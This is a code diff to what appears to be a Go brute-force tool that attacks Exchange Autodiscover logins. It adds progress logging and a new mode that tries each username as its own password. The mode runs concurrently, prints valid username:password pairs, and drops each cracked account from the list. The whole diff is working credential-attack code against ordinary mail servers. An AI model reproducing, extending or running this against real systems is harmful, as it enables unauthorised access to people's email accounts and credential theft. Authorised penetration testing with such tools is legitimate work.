@@ -37,6 +37,7 @@ var verbose = false
 var insecure = false
 var stopSuccess = false
 var proxyURL string
+var user_as_pass = true
 
 func autodiscoverDomain(domain string) string {
 	var autodiscoverURL string
@@ -158,7 +159,10 @@ func BruteForce() {
 	attempts := 0
 	stp := false
 
-	for _, p := range passwords {
+	for index, p := range passwords {
+		if index % 10 == 0 {
+			utils.Info.Printf("%d of %d passwords checked",index,len(passwords))
+		}
 		if p != "" {
 			attempts++
 		}
@@ -208,6 +212,38 @@ func BruteForce() {
 			attempts = 0
 		}
 	}
+
+	if user_as_pass {
+		sem := make(chan bool, concurrency)
+
+		for ui, u := range usernames {
+
+			time.Sleep(time.Millisecond * 500) //lets not flood it
+
+			sem <- true
+
+			go func(u string, p string, i int) {
+				defer func() { <-sem }()
+				out := connect(autodiscoverURL, u, p, basic, insecure)
+				out.Index = i
+
+				if verbose == true && out.Status != 200 {
+					utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
+					if out.Error != nil {
+						utils.Error.Printf("An error occured in connection - %s\n", out.Error)
+					}
+				}
+				if out.Status == 200 {
+					utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
+					//remove username from username list (we don't need to brute something we know)
+					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
+					if stopSuccess == true {
+						stp = true
+					}
+				}
+			}(u, u, ui)
+		}
+	}
 }
 
 //UserPassBruteForce function does a bruteforce using a supplied user:pass file
@@ -216,7 +252,10 @@ func UserPassBruteForce() {
 	count := 0
 	sem := make(chan bool, concurrency)
 	stp := false
-	for _, up := range userpass {
+	for index, up := range userpass {
+		if index % 10 == 0 {
+			utils.Info.Printf("%d of %d checked",index,len(userpass))
+		}
 		count++
 		if up == "" {
 			continue
